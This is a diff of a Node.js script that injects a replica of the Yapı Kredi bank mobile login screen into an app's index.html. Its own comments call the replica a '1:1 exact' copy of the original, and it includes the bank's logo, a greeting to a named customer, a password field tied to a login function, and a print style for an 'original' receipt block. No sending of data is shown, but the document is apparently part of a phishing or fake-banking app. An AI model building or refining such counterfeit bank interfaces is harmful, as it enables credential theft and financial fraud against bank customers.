@@ -4,28 +4,61 @@ const path = require('path');
 const logoBase64 = fs.readFileSync(path.join(__dirname, 'mobile_app', 'logo_base64.txt'), 'utf8').trim();
 let content = fs.readFileSync(path.join(__dirname, 'mobile_app', 'index.html'), 'utf8');
 
-// 1. CSS REPLACEMENT
-const cssStartMarker = '/* YAPİ KREDİ MOBİL GİRİŞ EKRANI */';
+// 1. FIX UNCLOSED @media print { ... } AND UPDATE CSS
+// First ensure @media print has its closing brace
+const printTarget = `    #originalDekontContent {
+        position: fixed !important;
+        left: 0 !important;
+        top: 0 !important;
+        width: 100% !important;
+        max-width: 100% !important;
+        transform: none !important;
+        box-shadow: none !important;
+        border: none !important;
+        padding: 10px !important;
+    }`;
+
+const printReplacement = `    #originalDekontContent {
+        position: fixed !important;
+        left: 0 !important;
+        top: 0 !important;
+        width: 100% !important;
+        max-width: 100% !important;
+        transform: none !important;
+        box-shadow: none !important;
+        border: none !important;
+        padding: 10px !important;
+    }
+}`;
+
+if (content.includes(printTarget) && !content.includes(printReplacement)) {
+    content = content.replace(printTarget, printReplacement);
+    console.log('[1/5] @media print kapama parantezi basariyla eklendi!');
+}
+
+// 2. RE-INJECT CLEAN CSS
+const cssStartMarker = '/* ORİJİNAL YAPI KREDİ MOBİL GİRİŞ EKRANI (1:1 BİREBİR) */';
 const cssEndMarker = '</style>';
 
 const newCss = `/* ORİJİNAL YAPI KREDİ MOBİL GİRİŞ EKRANI (1:1 BİREBİR) */
         .ykb-real-login-screen {
-            position: fixed;
-            top: 0; left: 0; right: 0; bottom: 0;
+            min-height: 100vh;
             width: 100%;
-            height: 100%;
+            max-width: 430px;
             background: #000000;
             color: #ffffff;
             display: flex;
             flex-direction: column;
             justify-content: space-between;
-            z-index: 9999;
+            position: relative;
+            z-index: 100;
             overflow-y: auto;
             overflow-x: hidden;
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
             padding-bottom: 74px;
             box-sizing: border-box;
             user-select: none;
+            margin: 0 auto;
         }
 
         /* Üst Header */
@@ -36,24 +69,29 @@ const newCss = `/* ORİJİNAL YAPI KREDİ MOBİL GİRİŞ EKRANI (1:1 BİREBİR)
             align-items: center;
             justify-content: space-between;
             position: relative;
+            width: 100%;
+            box-sizing: border-box;
         }
 
         .ykb-switch-btn {
-            width: 38px;
-            height: 38px;
-            border-radius: 50%;
-            border: 1px solid rgba(255, 255, 255, 0.3);
-            background: rgba(255, 255, 255, 0.05);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: #ffffff;
+            width: 38px !important;
+            height: 38px !important;
+            border-radius: 50% !important;
+            border: 1px solid rgba(255, 255, 255, 0.3) !important;
+            background: rgba(255, 255, 255, 0.05) !important;
+            display: flex !important;
+            align-items: center !important;
+            justify-content: center !important;
+            color: #ffffff !important;
             cursor: pointer;
             transition: background 0.2s;
             position: relative;
+            outline: none !important;
+            box-shadow: none !important;
+            padding: 0 !important;
         }
         .ykb-switch-btn:active {
-            background: rgba(255, 255, 255, 0.15);
+            background: rgba(255, 255, 255, 0.15) !important;
         }
 
         /* Profil geçiş tooltip balonu */
@@ -74,6 +112,7 @@ const newCss = `/* ORİJİNAL YAPI KREDİ MOBİL GİRİŞ EKRANI (1:1 BİREBİR)
             align-items: flex-start;
             gap: 6px;
             cursor: pointer;
+            box-sizing: border-box;
         }
         .ykb-switch-tooltip::before {
             content: "";
@@ -93,20 +132,26 @@ const newCss = `/* ORİJİNAL YAPI KREDİ MOBİL GİRİŞ EKRANI (1:1 BİREBİR)
         }
 
         .ykb-login-logo {
-            height: 27px;
-            object-fit: contain;
+            height: 28px !important;
+            max-height: 28px !important;
+            width: auto !important;
+            max-width: 180px !important;
+            object-fit: contain !important;
+            display: block !important;
         }
 
         .ykb-login-bell-btn {
-            background: transparent;
-            border: none;
-            color: #ffffff;
-            font-size: 22px;
+            background: transparent !important;
+            border: none !important;
+            color: #ffffff !important;
+            font-size: 22px !important;
             cursor: pointer;
             padding: 4px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
+            display: flex !important;
+            align-items: center !important;
+            justify-content: center !important;
+            outline: none !important;
+            box-shadow: none !important;
         }
 
         /* Orta Avatar ve Selamlama */
@@ -119,12 +164,15 @@ const newCss = `/* ORİJİNAL YAPI KREDİ MOBİL GİRİŞ EKRANI (1:1 BİREBİR)
             width: 100%;
             max-width: 380px;
             margin: 0 auto;
+            box-sizing: border-box;
         }
 
         .ykb-avatar-wrap {
             position: relative;
-            width: 114px;
-            height: 114px;
+            width: 110px;
+            height: 110px;
+            min-width: 110px;
+            min-height: 110px;
             border-radius: 50%;
             background: #dbe2ea;
             display: flex;
@@ -132,14 +180,15 @@ const newCss = `/* ORİJİNAL YAPI KREDİ MOBİL GİRİŞ EKRANI (1:1 BİREBİR)
             justify-content: center;
             cursor: pointer;
             box-shadow: 0 4px 16px rgba(0,0,0,0.3);
+            margin: 0 auto;
         }
 
         .ykb-avatar-badge {
             position: absolute;
             bottom: 2px;
             right: 2px;
-            width: 34px;
-            height: 34px;
+            width: 32px;
+            height: 32px;
             border-radius: 50%;
             background: #007bc7;
             border: 2.5px solid #000000;
@@ -156,26 +205,29 @@ const newCss = `/* ORİJİNAL YAPI KREDİ MOBİL GİRİŞ EKRANI (1:1 BİREBİR)
             font-weight: 500;
             color: #ffffff;
             letter-spacing: -0.2px;
+            text-align: center;
         }
 
         /* Beyaz Şifre Kutusu */
         .ykb-password-box {
-            width: 100%;
-            height: 52px;
-            background: #ffffff;
-            border-radius: 14px;
-            margin-top: 22px;
-            display: flex;
-            align-items: center;
-            padding: 0 16px;
-            position: relative;
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+            width: 100% !important;
+            max-width: 360px !important;
+            height: 52px !important;
+            background: #ffffff !important;
+            border-radius: 14px !important;
+            margin: 22px auto 0 !important;
+            display: flex !important;
+            align-items: center !important;
+            padding: 0 16px !important;
+            position: relative !important;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15) !important;
             transition: transform 0.2s, box-shadow 0.2s;
             cursor: text;
+            box-sizing: border-box !important;
         }
         .ykb-password-box.shake {
             animation: shakePass 0.4s ease;
-            box-shadow: 0 0 0 2px #ef4444;
+            box-shadow: 0 0 0 2px #ef4444 !important;
         }
         @keyframes shakePass {
             0%, 100% { transform: translateX(0); }
@@ -190,16 +242,20 @@ const newCss = `/* ORİJİNAL YAPI KREDİ MOBİL GİRİŞ EKRANI (1:1 BİREBİR)
         }
 
         .ykb-pass-input {
-            flex: 1;
-            background: transparent;
-            border: none;
-            outline: none;
-            font-size: 16px;
-            font-weight: 500;
-            color: #000000;
-            text-align: center;
-            padding: 0 8px;
-            letter-spacing: 2px;
+            flex: 1 !important;
+            background: transparent !important;
+            border: none !important;
+            outline: none !important;
+            box-shadow: none !important;
+            font-size: 16px !important;
+            font-weight: 500 !important;
+            color: #000000 !important;
+            text-align: center !important;
+            padding: 0 8px !important;
+            letter-spacing: 2px !important;
+            height: 48px !important;
+            line-height: 48px !important;
+            box-sizing: border-box !important;
         }
         .ykb-pass-input::placeholder {
             color: #8e8e93;
@@ -208,16 +264,18 @@ const newCss = `/* ORİJİNAL YAPI KREDİ MOBİL GİRİŞ EKRANI (1:1 BİREBİR)
         }
 
         .ykb-pass-action-btn {
-            background: transparent;
-            border: none;
-            color: #007bc7;
-            font-size: 22px;
+            background: transparent !important;
+            border: none !important;
+            color: #007bc7 !important;
+            font-size: 22px !important;
             cursor: pointer;
-            padding: 0;
-            display: flex;
-            align-items: center;
-            justify-content: center;
+            padding: 0 !important;
+            display: flex !important;
+            align-items: center !important;
+            justify-content: center !important;
             flex-shrink: 0;
+            outline: none !important;
+            box-shadow: none !important;
             transition: transform 0.15s, opacity 0.2s;
         }
         .ykb-pass-action-btn:active {
@@ -225,20 +283,22 @@ const newCss = `/* ORİJİNAL YAPI KREDİ MOBİL GİRİŞ EKRANI (1:1 BİREBİR)
         }
 
         .ykb-forgot-pass-row {
-            width: 100%;
-            display: flex;
-            justify-content: flex-end;
-            margin-top: 12px;
+            width: 100% !important;
+            max-width: 360px !important;
+            display: flex !important;
+            justify-content: flex-end !important;
+            margin: 12px auto 0 !important;
+            box-sizing: border-box !important;
         }
         .ykb-forgot-pass-link {
-            color: #ffffff;
-            font-size: 13.5px;
-            text-decoration: none;
+            color: #ffffff !important;
+            font-size: 13.5px !important;
+            text-decoration: none !important;
             opacity: 0.95;
             cursor: pointer;
         }
         .ykb-forgot-pass-link:hover {
-            text-decoration: underline;
+            text-decoration: underline !important;
         }
 
         .ykb-login-error-msg {
@@ -248,10 +308,12 @@ const newCss = `/* ORİJİNAL YAPI KREDİ MOBİL GİRİŞ EKRANI (1:1 BİREBİR)
             margin-top: 10px;
             text-align: center;
             width: 100%;
+            max-width: 360px;
             background: rgba(239, 68, 68, 0.15);
             padding: 6px 12px;
             border-radius: 8px;
             border: 1px solid rgba(239, 68, 68, 0.3);
+            box-sizing: border-box;
         }
 
         /* Alt Kampanya Kartları Slider */
@@ -259,6 +321,8 @@ const newCss = `/* ORİJİNAL YAPI KREDİ MOBİL GİRİŞ EKRANI (1:1 BİREBİR)
             position: relative;
             margin-top: 24px;
             margin-bottom: 10px;
+            width: 100%;
+            box-sizing: border-box;
         }
 
         .ykb-campaign-carousel {
@@ -268,6 +332,7 @@ const newCss = `/* ORİJİNAL YAPI KREDİ MOBİL GİRİŞ EKRANI (1:1 BİREBİR)
             padding: 0 16px;
             scrollbar-width: none;
             -ms-overflow-style: none;
+            box-sizing: border-box;
         }
         .ykb-campaign-carousel::-webkit-scrollbar {
             display: none;
@@ -286,6 +351,7 @@ const newCss = `/* ORİJİNAL YAPI KREDİ MOBİL GİRİŞ EKRANI (1:1 BİREBİR)
             cursor: pointer;
             flex-shrink: 0;
             transition: transform 0.15s ease;
+            box-sizing: border-box;
         }
         .ykb-campaign-card:active {
             transform: scale(0.98);
@@ -328,6 +394,7 @@ const newCss = `/* ORİJİNAL YAPI KREDİ MOBİL GİRİŞ EKRANI (1:1 BİREBİR)
             box-shadow: 0 8px 24px rgba(0, 0, 0, 0.7);
             z-index: 100;
             cursor: pointer;
+            box-sizing: border-box;
         }
         .ykb-atm-tooltip::after {
             content: "";
@@ -341,7 +408,7 @@ const newCss = `/* ORİJİNAL YAPI KREDİ MOBİL GİRİŞ EKRANI (1:1 BİREBİR)
 
         /* Alt Sabit Bar (Footer) */
         .ykb-login-bottombar {
-            position: fixed;
+            position: absolute;
             bottom: 0;
             left: 0;
             right: 0;
@@ -353,8 +420,10 @@ const newCss = `/* ORİJİNAL YAPI KREDİ MOBİL GİRİŞ EKRANI (1:1 BİREBİR)
             justify-content: space-around;
             padding: 0 8px;
             z-index: 999;
+            width: 100%;
             max-width: 430px;
             margin: 0 auto;
+            box-sizing: border-box;
         }
 
         .ykb-bottom-item {
@@ -435,23 +504,20 @@ const newCss = `/* ORİJİNAL YAPI KREDİ MOBİL GİRİŞ EKRANI (1:1 BİREBİR)
 
 const idxCssStart = content.indexOf(cssStartMarker);
 const idxCssEnd = content.indexOf(cssEndMarker);
-if (idxCssStart === -1 || idxCssEnd === -1) {
-    console.error('CSS marker bulunamadı!');
-    process.exit(1);
+if (idxCssStart !== -1 && idxCssEnd !== -1) {
+    content = content.slice(0, idxCssStart) + newCss + '    ' + content.slice(idxCssEnd);
+    console.log('[2/5] CSS basariyla yenilendi.');
 }
-content = content.slice(0, idxCssStart) + newCss + '    ' + content.slice(idxCssEnd);
-console.log('[1/4] CSS başarıyla güncellendi.');
 
-// 2. HTML REPLACEMENT (#mobileLoginPage)
-const htmlStartMarker = '<div id="mobileLoginPage" class="mobile-login-screen" style="display: none;">';
+// 3. HTML WITH BULLETPROOF INLINE STYLES FOR THE LOGO AND KEY ELEMENTS
+const htmlStartMarker = '<div id="mobileLoginPage"';
 const htmlEndMarker = '<div class="dark-home-panel">';
 
-const newHtml = `<!-- ORİJİNAL YAPI KREDİ MOBİL GİRİŞ EKRANI (1:1 BİREBİR) -->
-        <div id="mobileLoginPage" class="ykb-real-login-screen" style="display: none;">
+const newHtml = `<div id="mobileLoginPage" class="ykb-real-login-screen" style="display: none; min-height: 100vh; width: 100%; max-width: 430px; background: #000000; color: #ffffff; position: relative; box-sizing: border-box; margin: 0 auto; padding-bottom: 74px; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;">
             <!-- ÜST HEADER: GEÇİŞ BUTONU + LOGO + BİLDİRİM -->
-            <div class="ykb-login-topbar">
+            <div class="ykb-login-topbar" style="height: 60px; padding: 12px 18px 0; display: flex; align-items: center; justify-content: space-between; position: relative; width: 100%; box-sizing: border-box;">
                 <div class="position-relative">
-                    <button type="button" class="ykb-switch-btn" onclick="openUserSwitcherSheet()" title="Kullanıcı Değiştir">
+                    <button type="button" class="ykb-switch-btn" onclick="openUserSwitcherSheet()" title="Kullanıcı Değiştir" style="width: 38px; height: 38px; border-radius: 50%; border: 1px solid rgba(255, 255, 255, 0.3); background: rgba(255, 255, 255, 0.05); display: flex; align-items: center; justify-content: center; color: #ffffff; cursor: pointer; outline: none; padding: 0;">
                         <svg width="22" height="22" viewBox="0 0 24 24" fill="none">
                             <rect x="0.5" y="1" width="9" height="6.5" rx="1.5" stroke="white" stroke-width="1.1"/>
                             <text x="2" y="6" fill="white" font-size="4.5" font-family="-apple-system, sans-serif" font-weight="700">TR</text>
@@ -465,48 +531,48 @@ const newHtml = `<!-- ORİJİNAL YAPI KREDİ MOBİL GİRİŞ EKRANI (1:1 BİREB�
                     </button>
 
                     <!-- Profil Geçiş Tooltip Balonu (Orijinal Ekrandaki Metin) -->
-                    <div id="ykbSwitchTooltip" class="ykb-switch-tooltip">
+                    <div id="ykbSwitchTooltip" class="ykb-switch-tooltip" style="position: absolute; top: 52px; left: 0; background: #262628; color: #ffffff; border-radius: 12px; padding: 10px 14px; max-width: 220px; font-size: 11px; line-height: 1.35; box-shadow: 0 8px 24px rgba(0, 0, 0, 0.7); z-index: 100; display: flex; align-items: flex-start; gap: 6px; cursor: pointer;">
                         <div style="flex: 1;" onclick="openUserSwitcherSheet()">
                             Bireysel ve Kurumsal profilleriniz arasında geçiş yapabilir ya da başka kullanıcı ile kolayca giriş yapabilirsiniz!
                         </div>
-                        <span class="ykb-switch-tooltip-close" onclick="dismissSwitchTooltip(event)" title="Kapat">&times;</span>
+                        <span class="ykb-switch-tooltip-close" onclick="dismissSwitchTooltip(event)" title="Kapat" style="color: rgba(255, 255, 255, 0.6); font-size: 14px; cursor: pointer; margin-left: 4px; line-height: 1;">&times;</span>
                     </div>
                 </div>
 
                 <!-- Ortada Orijinal Yapı Kredi Beyaz Logosu -->
                 <div style="display: flex; align-items: center; justify-content: center;">
-                    <img src="${logoBase64}" alt="Yapı Kredi" class="ykb-login-logo">
+                    <img src="${logoBase64}" alt="Yapı Kredi" class="ykb-login-logo" style="height: 28px !important; max-height: 28px !important; width: auto !important; max-width: 170px !important; object-fit: contain !important; display: block !important;">
                 </div>
 
                 <!-- Sağda Bildirim Çanı -->
                 <div>
-                    <button type="button" class="ykb-login-bell-btn" onclick="alert('Yeni bildiriminiz bulunmamaktadır.')" title="Bildirimler">
+                    <button type="button" class="ykb-login-bell-btn" onclick="alert('Yeni bildiriminiz bulunmamaktadır.')" title="Bildirimler" style="background: transparent; border: none; color: #ffffff; font-size: 22px; cursor: pointer; padding: 4px; display: flex; align-items: center; justify-content: center; outline: none;">
                         <i class="bi bi-bell"></i>
                     </button>
                 </div>
             </div>
 
             <!-- ORTA ALAN: AVATAR + SELAMLAMA + BEYAZ ŞİFRE KUTUSU -->
-            <div class="ykb-login-center">
+            <div class="ykb-login-center" style="display: flex; flex-direction: column; align-items: center; text-align: center; padding: 10px 20px 0; width: 100%; max-width: 380px; margin: 0 auto; box-sizing: border-box;">
                 <!-- Yuvarlak Profil Resmi + Mavi Dokunma Rozeti -->
-                <div class="ykb-avatar-wrap" onclick="openUserSwitcherSheet()" title="Kullanıcı Değiştir">
-                    <svg width="72" height="72" viewBox="0 0 64 64" fill="none">
+                <div class="ykb-avatar-wrap" onclick="openUserSwitcherSheet()" title="Kullanıcı Değiştir" style="position: relative; width: 110px; height: 110px; min-width: 110px; min-height: 110px; border-radius: 50%; background: #dbe2ea; display: flex; align-items: center; justify-content: center; cursor: pointer; box-shadow: 0 4px 16px rgba(0,0,0,0.3); margin: 0 auto;">
+                    <svg width="68" height="68" viewBox="0 0 64 64" fill="none">
                         <circle cx="32" cy="22" r="13" fill="#cbd5e1"/>
                         <path d="M12 55C12 43 20.95 38 32 38C43.05 38 52 43 52 55" fill="#cbd5e1"/>
                     </svg>
-                    <div class="ykb-avatar-badge" title="Profil Değiştir">
-                        <i class="bi bi-hand-index-thumb-fill" style="font-size: 16px; color: #ffffff; transform: rotate(-10deg);"></i>
+                    <div class="ykb-avatar-badge" title="Profil Değiştir" style="position: absolute; bottom: 2px; right: 2px; width: 32px; height: 32px; border-radius: 50%; background: #007bc7; border: 2.5px solid #000000; display: flex; align-items: center; justify-content: center; color: #ffffff;">
+                        <i class="bi bi-hand-index-thumb-fill" style="font-size: 15px; color: #ffffff; transform: rotate(-10deg);"></i>
                     </div>
                 </div>
 
                 <!-- Dinamik Selamlama ve Hesap Sahibi İsmi (Örn: İyi Geceler, BERKAY ÜLKER) -->
-                <div class="ykb-greeting-title" id="ykbLoginGreeting">
+                <div class="ykb-greeting-title" id="ykbLoginGreeting" style="margin-top: 18px; font-size: 17px; font-weight: 500; color: #ffffff; letter-spacing: -0.2px; text-align: center;">
                     İyi Geceler, BERKAY ÜLKER
                 </div>
 
                 <!-- Beyaz Şifre Hap Kutusu (Orijinal Yapı Kredi 1:1) -->
-                <div class="ykb-password-box" id="ykbPasswordBox" onclick="document.getElementById('ykbPasswordInput').focus()">
-                    <i class="bi bi-lock-fill ykb-pass-lock-icon"></i>
+                <div class="ykb-password-box" id="ykbPasswordBox" onclick="document.getElementById('ykbPasswordInput').focus()" style="width: 100%; max-width: 360px; height: 52px; background: #ffffff; border-radius: 14px; margin: 22px auto 0; display: flex; align-items: center; padding: 0 16px; position: relative; box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15); box-sizing: border-box; cursor: text;">
+                    <i class="bi bi-lock-fill ykb-pass-lock-icon" style="color: #8e8e93; font-size: 17px; flex-shrink: 0;"></i>
                     <input 
                         type="password" 
                         id="ykbPasswordInput" 
@@ -517,103 +583,104 @@ const newHtml = `<!-- ORİJİNAL YAPI KREDİ MOBİL GİRİŞ EKRANI (1:1 BİREB�
                         autocomplete="current-password"
                         onkeydown="onPasswordKeyDown(event)"
                         oninput="onPasswordInput(event)"
+                        style="flex: 1; background: transparent; border: none; outline: none; box-shadow: none; font-size: 16px; font-weight: 500; color: #000000; text-align: center; padding: 0 8px; letter-spacing: 2px; height: 48px; line-height: 48px; box-sizing: border-box;"
                     />
-                    <button type="button" class="ykb-pass-action-btn" id="ykbPassSubmitBtn" onclick="doMobilePasswordLogin()" title="Giriş Yap">
+                    <button type="button" class="ykb-pass-action-btn" id="ykbPassSubmitBtn" onclick="doMobilePasswordLogin()" title="Giriş Yap" style="background: transparent; border: none; color: #007bc7; font-size: 22px; cursor: pointer; padding: 0; display: flex; align-items: center; justify-content: center; flex-shrink: 0; outline: none;">
                         <i class="bi bi-arrow-right-circle-fill"></i>
                     </button>
                 </div>
 
                 <!-- Hata Bildirimi (Şifre Yanlış Olduğunda) -->
-                <div id="ykbLoginErrorBanner" class="ykb-login-error-msg">
+                <div id="ykbLoginErrorBanner" class="ykb-login-error-msg" style="display: none; color: #f87171; font-size: 12px; margin-top: 10px; text-align: center; width: 100%; max-width: 360px; background: rgba(239, 68, 68, 0.15); padding: 6px 12px; border-radius: 8px; border: 1px solid rgba(239, 68, 68, 0.3); box-sizing: border-box;">
                     Girdiğiniz şifre hatalıdır. Lütfen kontrol ediniz.
                 </div>
 
                 <!-- Şifremi Unuttum Bağlantısı -->
-                <div class="ykb-forgot-pass-row">
-                    <a href="javascript:void(0)" class="ykb-forgot-pass-link" onclick="handleForgotPassword()">Şifremi Unuttum</a>
+                <div class="ykb-forgot-pass-row" style="width: 100%; max-width: 360px; display: flex; justify-content: flex-end; margin: 12px auto 0; box-sizing: border-box;">
+                    <a href="javascript:void(0)" class="ykb-forgot-pass-link" onclick="handleForgotPassword()" style="color: #ffffff; font-size: 13.5px; text-decoration: none; opacity: 0.95; cursor: pointer;">Şifremi Unuttum</a>
                 </div>
             </div>
 
             <!-- ALT KAMPANYA KARTLARI SLIDER (Orijinal Ekrandaki Kartlar) -->
-            <div class="ykb-campaign-carousel-wrap">
-                <div class="ykb-campaign-carousel">
+            <div class="ykb-campaign-carousel-wrap" style="position: relative; margin-top: 24px; margin-bottom: 10px; width: 100%; box-sizing: border-box;">
+                <div class="ykb-campaign-carousel" style="display: flex; gap: 12px; overflow-x: auto; padding: 0 16px; scrollbar-width: none; box-sizing: border-box;">
                     <!-- Kart 1: Araç Kiralama -->
-                    <div class="ykb-campaign-card" onclick="alert('Kampanya detayları yakında aktif olacaktır.')">
-                        <div class="ykb-campaign-icon-badge">
+                    <div class="ykb-campaign-card" onclick="alert('Kampanya detayları yakında aktif olacaktır.')" style="min-width: 280px; width: 280px; height: 86px; background: #1c1c1e; border-radius: 14px; padding: 10px 14px; display: flex; align-items: center; gap: 12px; cursor: pointer; flex-shrink: 0; box-sizing: border-box;">
+                        <div class="ykb-campaign-icon-badge" style="width: 50px; height: 50px; border-radius: 50%; background: radial-gradient(circle at 35% 30%, #38bdf8 0%, #007bc7 85%); display: flex; align-items: center; justify-content: center; flex-shrink: 0; color: #ffffff; font-size: 22px;">
                             <i class="bi bi-car-front-fill" style="font-size: 24px; color: #ffffff;"></i>
                         </div>
-                        <div class="ykb-campaign-text">
+                        <div class="ykb-campaign-text" style="color: #ffffff; font-size: 12px; font-weight: 600; line-height: 1.35;">
                             Yapı Kredi müşterilerine özel araç kiralama fırsatı!
                         </div>
                     </div>
 
                     <!-- Kart 2: Global Finance Ödülü -->
-                    <div class="ykb-campaign-card" onclick="alert('Global Finance Best Digital Bank Awards 2026')">
-                        <div class="ykb-campaign-icon-badge" style="background: radial-gradient(circle at 35% 30%, #38bdf8 0%, #007bc7 85%);">
+                    <div class="ykb-campaign-card" onclick="alert('Global Finance Best Digital Bank Awards 2026')" style="min-width: 280px; width: 280px; height: 86px; background: #1c1c1e; border-radius: 14px; padding: 10px 14px; display: flex; align-items: center; gap: 12px; cursor: pointer; flex-shrink: 0; box-sizing: border-box;">
+                        <div class="ykb-campaign-icon-badge" style="width: 50px; height: 50px; border-radius: 50%; background: radial-gradient(circle at 35% 30%, #38bdf8 0%, #007bc7 85%); display: flex; align-items: center; justify-content: center; flex-shrink: 0; color: #ffffff; font-size: 22px;">
                             <i class="bi bi-trophy-fill" style="font-size: 23px; color: #ffc107;"></i>
                         </div>
-                        <div class="ykb-campaign-text">
+                        <div class="ykb-campaign-text" style="color: #ffffff; font-size: 12px; font-weight: 600; line-height: 1.35;">
                             Global Finance Best Digital Bank Awards 2026'da büyük ödül!
                         </div>
                     </div>
 
                     <!-- Kart 3: World Pay / Puan -->
-                    <div class="ykb-campaign-card" onclick="alert('World Puan Fırsatları')">
-                        <div class="ykb-campaign-icon-badge" style="background: radial-gradient(circle at 35% 30%, #a855f7 0%, #007bc7 85%);">
+                    <div class="ykb-campaign-card" onclick="alert('World Puan Fırsatları')" style="min-width: 280px; width: 280px; height: 86px; background: #1c1c1e; border-radius: 14px; padding: 10px 14px; display: flex; align-items: center; gap: 12px; cursor: pointer; flex-shrink: 0; box-sizing: border-box;">
+                        <div class="ykb-campaign-icon-badge" style="width: 50px; height: 50px; border-radius: 50%; background: radial-gradient(circle at 35% 30%, #a855f7 0%, #007bc7 85%); display: flex; align-items: center; justify-content: center; flex-shrink: 0; color: #ffffff; font-size: 22px;">
                             <i class="bi bi-gift-fill" style="font-size: 21px; color: #ffffff;"></i>
                         </div>
-                        <div class="ykb-campaign-text">
+                        <div class="ykb-campaign-text" style="color: #ffffff; font-size: 12px; font-weight: 600; line-height: 1.35;">
                             World üye işyerlerinde 500 TL Worldpuan hediye!
                         </div>
                     </div>
                 </div>
 
                 <!-- ATM / Şube İşlemleri Tooltip Balonu (Aşağıyı İşaret Eden Orijinal Tooltip) -->
-                <div id="ykbAtmTooltip" class="ykb-atm-tooltip" onclick="dismissAtmTooltip()">
+                <div id="ykbAtmTooltip" class="ykb-atm-tooltip" onclick="dismissAtmTooltip()" style="position: absolute; right: 14px; bottom: 74px; background: #262628; color: #ffffff; border-radius: 12px; padding: 8px 12px; max-width: 175px; font-size: 11px; line-height: 1.3; font-weight: 500; box-shadow: 0 8px 24px rgba(0, 0, 0, 0.7); z-index: 100; cursor: pointer; box-sizing: border-box;">
                     ATM / Şube işlemlerine artık buradan ulaşabilirsiniz!
                 </div>
             </div>
 
             <!-- ALT SABİT MENÜ BARI: FAST İŞLEMLERİ, PİYASALAR, JET QR, WORLD PAY, DAHA FAZLASI -->
-            <div class="ykb-login-bottombar">
+            <div class="ykb-login-bottombar" style="position: absolute; bottom: 0; left: 0; right: 0; height: 70px; background: #000000; border-top: 1px solid rgba(255, 255, 255, 0.08); display: flex; align-items: center; justify-content: space-around; padding: 0 8px; z-index: 999; width: 100%; max-width: 430px; margin: 0 auto; box-sizing: border-box;">
                 <!-- FAST İŞLEMLERİ -->
-                <a href="javascript:void(0)" class="ykb-bottom-item" onclick="promptLoginForAction('FAST İşlemleri')">
-                    <div class="ykb-bottom-icon">
+                <a href="javascript:void(0)" class="ykb-bottom-item" onclick="promptLoginForAction('FAST İşlemleri')" style="flex: 1; display: flex; flex-direction: column; align-items: center; justify-content: center; color: #9ca3af; text-decoration: none; gap: 4px; cursor: pointer; padding: 4px 0;">
+                    <div class="ykb-bottom-icon" style="font-size: 19px; color: #ffffff; height: 22px; display: flex; align-items: center; justify-content: center;">
                         <span style="font-weight: 800; font-style: italic; font-size: 15px; color: #ffffff; letter-spacing: -0.5px;">fast</span>
                     </div>
-                    <span class="ykb-bottom-label">FAST İŞLEMLERİ</span>
+                    <span class="ykb-bottom-label" style="font-size: 8.5px; font-weight: 700; letter-spacing: 0.2px; color: #cbd5e1; text-transform: uppercase;">FAST İŞLEMLERİ</span>
                 </a>
 
                 <!-- PİYASALAR -->
-                <a href="javascript:void(0)" class="ykb-bottom-item" onclick="promptLoginForAction('Piyasalar')">
-                    <div class="ykb-bottom-icon">
+                <a href="javascript:void(0)" class="ykb-bottom-item" onclick="promptLoginForAction('Piyasalar')" style="flex: 1; display: flex; flex-direction: column; align-items: center; justify-content: center; color: #9ca3af; text-decoration: none; gap: 4px; cursor: pointer; padding: 4px 0;">
+                    <div class="ykb-bottom-icon" style="font-size: 19px; color: #ffffff; height: 22px; display: flex; align-items: center; justify-content: center;">
                         <i class="bi bi-graph-up-arrow" style="font-size: 18px; color: #ffffff;"></i>
                     </div>
-                    <span class="ykb-bottom-label">PİYASALAR</span>
+                    <span class="ykb-bottom-label" style="font-size: 8.5px; font-weight: 700; letter-spacing: 0.2px; color: #cbd5e1; text-transform: uppercase;">PİYASALAR</span>
                 </a>
 
                 <!-- JET QR (Ortadaki Vurgulu Mavi Kare) -->
-                <a href="javascript:void(0)" class="ykb-bottom-item" onclick="promptLoginForAction('Jet QR')">
-                    <div class="ykb-jet-qr-btn">
+                <a href="javascript:void(0)" class="ykb-bottom-item" onclick="promptLoginForAction('Jet QR')" style="flex: 1; display: flex; flex-direction: column; align-items: center; justify-content: center; color: #9ca3af; text-decoration: none; gap: 4px; cursor: pointer; padding: 4px 0;">
+                    <div class="ykb-jet-qr-btn" style="width: 44px; height: 40px; border-radius: 11px; background: #009fe3; display: flex; align-items: center; justify-content: center; color: #ffffff; font-size: 22px; box-shadow: 0 2px 10px rgba(0, 159, 227, 0.45);">
                         <i class="bi bi-qr-code-scan"></i>
                     </div>
-                    <span class="ykb-bottom-label" style="color: #ffffff; margin-top: 2px;">JET QR</span>
+                    <span class="ykb-bottom-label" style="color: #ffffff; margin-top: 2px; font-size: 8.5px; font-weight: 700;">JET QR</span>
                 </a>
 
                 <!-- WORLD PAY -->
-                <a href="javascript:void(0)" class="ykb-bottom-item" onclick="promptLoginForAction('World Pay')">
-                    <div class="ykb-bottom-icon">
+                <a href="javascript:void(0)" class="ykb-bottom-item" onclick="promptLoginForAction('World Pay')" style="flex: 1; display: flex; flex-direction: column; align-items: center; justify-content: center; color: #9ca3af; text-decoration: none; gap: 4px; cursor: pointer; padding: 4px 0;">
+                    <div class="ykb-bottom-icon" style="font-size: 19px; color: #ffffff; height: 22px; display: flex; align-items: center; justify-content: center;">
                         <span style="font-weight: 900; font-style: italic; font-size: 14px; color: #ffffff; letter-spacing: 0.5px;">PAY</span>
                     </div>
-                    <span class="ykb-bottom-label">WORLD PAY</span>
+                    <span class="ykb-bottom-label" style="font-size: 8.5px; font-weight: 700; letter-spacing: 0.2px; color: #cbd5e1; text-transform: uppercase;">WORLD PAY</span>
                 </a>
 
                 <!-- DAHA FAZLASI -->
-                <a href="javascript:void(0)" class="ykb-bottom-item" onclick="openUserSwitcherSheet()">
-                    <div class="ykb-bottom-icon">
+                <a href="javascript:void(0)" class="ykb-bottom-item" onclick="openUserSwitcherSheet()" style="flex: 1; display: flex; flex-direction: column; align-items: center; justify-content: center; color: #9ca3af; text-decoration: none; gap: 4px; cursor: pointer; padding: 4px 0;">
+                    <div class="ykb-bottom-icon" style="font-size: 22px; color: #ffffff; height: 22px; display: flex; align-items: center; justify-content: center;">
                         <i class="bi bi-list" style="font-size: 22px; color: #ffffff;"></i>
                     </div>
